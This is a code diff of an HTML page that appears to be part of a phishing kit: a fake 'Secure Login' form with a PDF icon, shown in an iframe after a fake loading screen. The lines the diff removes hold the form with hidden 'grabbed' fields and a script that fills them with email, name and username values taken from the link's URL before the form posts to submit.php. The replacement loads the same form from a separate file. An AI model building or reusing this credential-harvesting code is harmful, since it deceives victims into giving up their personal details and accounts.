@@ -74,43 +74,6 @@
       height: auto;
     }
 
-    /* Login Form Inside the Iframe */
-    .login-form {
-      width: 100%;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.96);
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
-      border-radius: 10px;
-      text-align: center;
-    }
-
-    .login-form img.logo {
-      width: 80px;
-      margin-bottom: 15px;
-    }
-
-    .login-form input {
-      width: 100%;
-      padding: 10px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-    }
-
-    .login-form button {
-      width: 100%;
-      padding: 10px;
-      background: #007bff;
-      border: none;
-      color: white;
-      font-weight: bold;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .login-form button:hover {
-      background: #0056b3;
-    }
   </style>
 </head>
 <body>
@@ -130,25 +93,8 @@
   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1200px-Anonymous_emblem.svg.png" alt="Loading...">
 </div>
 
-<!-- Login Form Inside an Iframe -->
-<iframe class="login-iframe" id="loginIframe" srcdoc="
-  <div class='login-form'>
-    <img src='https://cdn-icons-png.flaticon.com/512/732/732221.png' class='logo' alt='PDF'>
-    <h3>Welcome to Secure Login</h3>
-    <form action='submit.php' method='POST'>
-      <input type='text' name='name' id='nameInput' placeholder='Full Name' required>
-      <input type='email' name='email' id='emailInput' placeholder='Email Address' required>
-      <input type='text' name='username' id='userInput' placeholder='Username' required>
-
-      <!-- Hidden grabbed values -->
-      <input type='hidden' name='grabbed_email' id='grabbedEmail'>
-      <input type='hidden' name='grabbed_name' id='grabbedName'>
-      <input type='hidden' name='grabbed_user' id='grabbedUser'>
-
-      <button type='submit'>Login</button>
-    </form>
-  </div>
-"></iframe>
+<!-- Login Form Iframe -->
+<iframe class="login-iframe" id="loginIframe" src="loginForm.html"></iframe>
 
 <script>
   // Rotate background images every 5 seconds
@@ -167,26 +113,6 @@
       document.getElementById("loginIframe").style.display = "block";  // Show the login iframe
     }, 2000);
   });
-
-  // Auto grab data from URL
-  function getParam(param) {
-    const url = new URL(window.location.href);
-    return url.searchParams.get(param) || "";
-  }
-
-  const email = getParam("email");
-  const name = getParam("name");
-  const username = getParam("username");
-
-  // Access iframe and populate form
-  const iframeDoc = document.getElementById("loginIframe").contentWindow.document;
-  iframeDoc.getElementById("emailInput").value = email;
-  iframeDoc.getElementById("nameInput").value = name;
-  iframeDoc.getElementById("userInput").value = username;
-
-  iframeDoc.getElementById("grabbedEmail").value = email;
-  iframeDoc.getElementById("grabbedName").value = name;
-  iframeDoc.getElementById("grabbedUser").value = username;
 </script>
 
 </body>
